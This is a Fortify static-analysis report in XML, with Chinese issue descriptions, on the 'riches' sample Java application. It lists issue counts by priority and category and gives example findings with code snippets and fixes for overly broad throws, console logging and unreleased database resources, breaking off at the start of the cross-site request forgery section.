<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ReportDefinition type="standard">
    <TemplateName>Fortify Developer Workbook</TemplateName>
    <TemplatePath></TemplatePath>
    <LogoPath>/MF_logo.jpg</LogoPath>
    <Footnote>Copyright 2019 Micro Focus or one of its affiliates.</Footnote>
    <UserName></UserName>
    <ReportSection enabled="true" optionalSubsections="false">
        <Title>Report Overview</Title>
        <SubSection enabled="true">
            <Title>Report Summary</Title>
            <Description>This provides a high level summary of the findings that the analysis produced.  Also includes basic information on the scope of the scan.</Description>
            <Text>On 2021-9-6, a source code review was performed over the riches code base. 158 files, 2,382 LOC (Executable) were scanned. A total of 434 issues were uncovered during the analysis.  This report provides a comprehensive description of all the types of issues found in this project.  Specific examples and source code are provided for each issue type.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Issue Summary by Fortify Priority Order</Title>
            <Description>A table summarizing the number of issues found and the breakdown of issues in each Fortify Priority Level</Description>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Fortify Priority Order</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="277">
                        <groupTitle>Low</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="89">
                        <groupTitle>High</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="60">
                        <groupTitle>Critical</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Medium</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="false">
        <Title>Issue Summary</Title>
        <SubSection enabled="true">
            <Title>Overall number of results</Title>
            <Description>Results count</Description>
            <Text>The scan found 434 issues.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Issues By Category</Title>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="37">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="37">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="24">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Struts 2: Unvalidated Action</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Command Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="17">
                        <groupTitle>Privacy Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>Missing Check against Null</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>SQL Injection: Hibernate</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Cross-Site Scripting: Reflected</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Path Manipulation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>System Information Leak</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Log Forging</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Poor Style: Value Never Read</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Access Control: Database</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Cross-Site Scripting: Poor Validation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>SQL Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Struts 2 Bad Practices: Dynamic Method Invocation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Denial of Service</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Hidden Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Randomness</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Debug Information</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Redundant Null Check</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Unreleased Resource: Sockets</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Cookie Security: Cookie not Sent Over SSL</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Cookie Security: HTTPOnly not Set</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dangerous File Inclusion</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Database Bad Practices: Use of Restricted Accounts</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dynamic Code Evaluation: Unsafe Deserialization</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Misconfiguration: Incomplete Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>JavaScript Hijacking</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>XML External Entity Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: JVM Termination</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: Sockets</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Key Management: Hardcoded Encryption Key</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Missing XML Validation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Often Misused: File Upload</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Open Redirect</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Logging Practice: Logger Not Declared Static Final</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Portability Flaw: File Separator</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Server-Side Request Forgery</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Unchecked Return Value</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Weak Encryption: Insecure Mode of Operation</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Results Outline</Title>
        <SubSection enabled="true">
            <Title>Vulnerability Examples by Category</Title>
            <Description>Results summary of all issue categories.  Vulnerability examples are provided by category.</Description>
            <IssueListing listing="true" limit="5">
                <Refinement></Refinement>
                <Chart chartType="list">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="37">
                        <groupTitle>Poor Error Handling: Overly Broad Throws</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>AccountService.java 中的 addAccount() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>声明一种可以抛出 Exception 或 Throwable 异常的方法，从而使调用者很难处理和修复发生的错误。Java 异常机制的设置是：调用者可以方便地预计有可能发生的各种错误，并为每种异常情况编写处理代码。同时声明：一个方法抛出一个过于笼统的异常违反该系统。

示例：以下方法抛出了三种类型的异常。


public void doExchange()
  throws IOException, InvocationTargetException,
         SQLException {
  ...
}



这样写看上去会显得更加紧凑


public void doExchange()
  throws Exception {
  ...
}


这样做会防碍调用者理解和处理所发生的异常。此外，如果 doExchange() 因为变更了代码，而引入了一个需要不同于之前异常处理方式的新型异常，则不能使用简单的方式来处理该要求。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>不要声明抛出 Exception 或 Throwable 异常的方法。如果方法抛出的异常无法恢复，或者通常不能被调用者捕获，那么可以考虑抛出未检查的异常，而不是已检查的异常。这可以通过实现一个继承自 RuntimeException 或Error 的类来代替 Exception，或者还可以在方法中加入 try/catch 块将已检查的异常转换为未检查异常。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>37</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E4C0D19B7624F30E51529B5A6E4346E6" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 getAllAccounts() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>49</LineStart>
                                <Snippet>    }

    public static List getAllAccounts() throws Exception
    {
        Session session = null;</Snippet>
                                <TargetFunction>Function: getAllAccounts()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="03213BD36F78FCCA237910BE2B4F677B" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 getAccounts() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>69</LineStart>
                                <Snippet>    }

    public static List getAccounts(String username) throws Exception
    {
        Session session = null;</Snippet>
                                <TargetFunction>Function: getAccounts()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F97179F7726EBCD9A71D5E283C5C2681" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 deposit() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>91</LineStart>
                                <Snippet>    }

    public static int deposit(String acct, double amount, String memo) throws Exception {
        Account account;
        Session session = null;</Snippet>
                                <TargetFunction>Function: deposit()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FBA6B228B97B8B473FD55B814B28389C" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 writeCheck() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>133</LineStart>
                                <Snippet>    }

    public static int writeCheck(String payee, String addr, String memo, String acct, double amount) throws Exception
    {
        Account fromAcct;</Snippet>
                                <TargetFunction>Function: writeCheck()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="34A50D24068532BB24417F0FBC244E8E" ruleID="572EA1F6-FC86-443E-B1A9-A227D5AD17CC">
                            <Category>Poor Error Handling: Overly Broad Throws</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 addAccount() 方法抛出一个过于笼统的异常，从而使调用者很难处理和修复发生的错误。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>21</LineStart>
                                <Snippet>	final private static Logger log = Logger.getLogger(ConnectionFactory.class.getName());

    public static boolean addAccount(Account account) throws Exception
    {
        Profile profile = ProfileService.getProfile(account.getUsername());</Snippet>
                                <TargetFunction>Function: addAccount()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="37">
                        <groupTitle>Poor Logging Practice: Use of a System Output Stream</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>示例 1：开发人员学习编写的第一个 Java 程序如下所示：


public class MyClass
  public static void main(String[] args) {
    System.out.println("hello world");
  }
}


多数程序员深入了解 Java 的许多精妙之处后，有一部分人仍会依赖于这一基础知识，始终使用 System.out.println() 编写进行标准输出的消息。

这里的问题是，直接在标准输出流或标准错误流中写入信息通常会作为一种非结构化日志记录形式使用。结构化日志记录系统提供了各种要素，如日志级别、统一的格式、日志标示符、次数统计，而且，可能最重要的是，将日志信息指向正确位置的功能。当系统输出流的使用与正确使用日志记录功能的代码混合在一起时，得出的结果往往是一个保存良好但缺少重要信息的日志。

开发者普遍认为需要使用结构化日志记录，但是很多人在“产前”的软件开发中仍使用系统输出流功能。如果您正在检查的代码是在开发阶段的初期生成的，那么对 System.out 或 System.err 的使用可能会在转向结构化日志记录系统的过程中导致漏洞。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>使用 Java 日志记录工具而不是 System.out 或 System.err。

示例 2：例如，Example 1 中的“hello world”程序可以使用 log4j 按以下方式进行重写：


import org.apache.log4j.Logger;
import org.apache.log4j.BasicConfigurator;

public class MyClass {
  private final static Logger logger =
            Logger.getLogger(MyClass.class);

  public static void main(String[] args) {
    BasicConfigurator.configure();
    logger.info("hello world");
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>37</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2B7B34C0375AAD2E26514AA6E56AE454" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>System.out.println("datasource before");
            datasource = (DataSource)ctx.lookup("java:comp/env/jdbc/riches");
System.out.println("datasource after");
            if (datasource == null)
            {</Snippet>
                                <TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2B5A6761EDACFE7676753C518047084B" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>		}
		catch(SQLException e) {
			System.err.println("Cannot shutdown the builtin database:" + e.getMessage());
		}
	}</Snippet>
                                <TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="70FD4FDB934DFE608E51773D41AFE94E" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>43</LineStart>
                                <Snippet>            BasicDataSource bds =  (BasicDataSource)datasource;
            bds.setUrl(bds.getUrl().replaceAll("TOMCAT_HOME", sanitizeForReplace(System.getProperty("catalina.home"))));
            System.out.println("Starting built in database in-process with Tomcat...");
            System.out.println("JDBC URL is: " + bds.getUrl());
        }</Snippet>
                                <TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A6BF7D9843FA84897510E11B26E8F251" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>27</LineStart>
                                <Snippet>                throw new Exception("Boom - No Context");
            }
System.out.println("datasource before");
            datasource = (DataSource)ctx.lookup("java:comp/env/jdbc/riches");
System.out.println("datasource after");            </Snippet>
                                <TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BE3FD973042D09AE4A8A0E576D7F8B24" ruleID="F972FE42-6C15-47D2-BD5C-448166A574C2">
                            <Category>Poor Logging Practice: Use of a System Output Stream</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 println() 而不是专门的日志记录工具，会导致难以监控程序运行状况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>37</LineStart>
                                <Snippet>
	public void contextDestroyed(ServletContextEvent event) {
		System.out.println("Stopping the built in database...");
		try {
			Connection conn = datasource.getConnection();</Snippet>
                                <TargetFunction>FunctionCall: println()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="24">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>DatabaseController.java 中的函数 contextDestroyed() 有时无法成功释放由第 39 行的 getConnection() 分配的数据库资源。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>资源泄露至少有两种常见的原因：

－ 错误状况及其他异常情况。

－ 未明确程序的哪一部份负责释放资源。

大部分 Unreleased Resource 问题只会导致常规软件可靠性问题，但如果攻击者能够故意触发资源泄漏，该攻击者就有可能通过耗尽资源池的方式发起 Denial of Service 攻击。

示例：在正常条件下，以下代码会执行数据库查询指令，处理数据库返回的结果，并关闭已分配的指令对象。但如果在执行 SQL 或是处理结果时发生异常，指令对象将不会关闭。如果这种情况频繁出现，数据库将用完所有可用的指针，且不能再执行任何 SQL 查询。

  Statement stmt = conn.createStatement();
  ResultSet rs = stmt.executeQuery(CXN_SQL);
  harvestResults(rs);
  stmt.close();
&#xD;
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>1. 请不要依赖 finalize() 回收资源。为了使对象的 finalize() 方法能被调用，垃圾收集器必须确认对象符合垃圾回收的条件。但是垃圾收集器只有在 JVM 内存过小时才会使用。因此，无法保证何时能够调用该对象的 finalize() 方法。垃圾收集器最终运行时，可能出现这样的情况，即在短时间内回收大量的资源，这种情况会导致“突发”性能，并降低总体系统通过量。随着系统负载的增加，这种影响会越来越明显。

最后，如果某一资源回收操作被挂起（例如该操作需要通过网络访问数据库），那么执行 finalize() 方法的线程也将被挂起。

2. 在 finally 代码段中释放资源。示例中的代码可按以下方式改写：


  public void execCxnSql(Connection conn) {
    Statement stmt;
    try {
      stmt = conn.createStatement();
      ResultSet rs = stmt.executeQuery(CXN_SQL);
      ...
    }
    finally {
      if (stmt != null) {
        safeClose(stmt);
      }
    }
}

public static void safeClose(Statement stmt) {
  if (stmt != null) {
    try {
      stmt.close();
    } catch (SQLException e) {
      log(e);
    }
  }
}


以上方案使用了一个助手函数，用以记录在尝试关闭指令时可能产生的异常。该助手函数大约会在需要关闭指令时重新使用。

此外，execCxnSql 方法不会将 stmt 对象初始化为 null，而是进行检查，以确保在调用 safeClose() 之前stmt 不为 null。如果没有进行 null 检查，Java 编译器就会报告 stmt 可能没有进行初始化。编译器做出这一判断源于 Java 可以检测未初始化的变量。如果用一种更加复杂的方法将 stmt 初始化为 null，那么编译器就无法检测 stmt 未经初始化便使用的情况。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 请注意，关闭数据库连接可能会自动释放与连接对象关联的其他资源，也可能不会自动释放。如果应用程序使用连接池，则最好在关闭连接后，明确关闭其他资源。如果应用程序未使用连接池，则数据库连接关闭后，其他资源也将自动关闭。在这种情况下，此漏洞无效。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>24</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="20858AB8E72A0D5C71E13430666164D5" ruleID="3C71B180-92A2-412C-890D-09F29ECCEC62">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AccountService.java 中的函数 writeCheck() 有时无法成功释放由第 140 行的 &lt;a href="location://WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java###112###1###0"&gt;getSession()&lt;/a&gt; 分配的数据库资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>140</LineStart>
                                <Snippet>
        try{
            session = ConnectionFactory.getInstance().getSession();
            Criteria criteria = session.createCriteria(Account.class);
</Snippet>
                                <TargetFunction>session = getSession()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DAED16D4E94395076C1B5750E711C06B" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>DatabaseController.java 中的函数 contextDestroyed() 有时无法成功释放由第 39 行的 getConnection() 分配的数据库资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>39</LineStart>
                                <Snippet>		System.out.println("Stopping the built in database...");
		try {
			Connection conn = datasource.getConnection();
			conn.createStatement().execute("SHUTDOWN COMPACT");
			conn.close();</Snippet>
                                <TargetFunction>conn = getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="820EBFAF1D058D4E4952B761F48B8D86" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>DatabaseController.java 中的函数 contextDestroyed() 有时无法成功释放由第 39 行的 getConnection() 分配的数据库资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>40</LineStart>
                                <Snippet>		try {
			Connection conn = datasource.getConnection();
			conn.createStatement().execute("SHUTDOWN COMPACT");
			conn.close();
		}</Snippet>
                                <TargetFunction>conn.createStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D4D7CA906DA6237F200DB132589C6DE4" ruleID="3C71B180-92A2-412C-890D-09F29ECCEC62">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AccountService.java 中的函数 deposit() 有时无法成功释放由第 96 行的 &lt;a href="location://WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java###112###1###0"&gt;getSession()&lt;/a&gt; 分配的数据库资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>96</LineStart>
                                <Snippet>        net.sf.hibernate.Transaction transaction = null;
        try {
            session = ConnectionFactory.getInstance().getSession();
            Criteria criteria = session.createCriteria(Account.class);
</Snippet>
                                <TargetFunction>session = getSession()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="820EBFAF1D058D4E4952B761F48B8D85" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>DatabaseController.java 中的函数 contextDestroyed() 有时无法成功释放由第 56 行的 getConnection() 分配的数据库资源。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>57</LineStart>
                                <Snippet>        try {
			conn = datasource.getConnection();
			conn.createStatement().execute("SHUTDOWN COMPACT");
			conn.close();
		}</Snippet>
                                <TargetFunction>conn.createStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
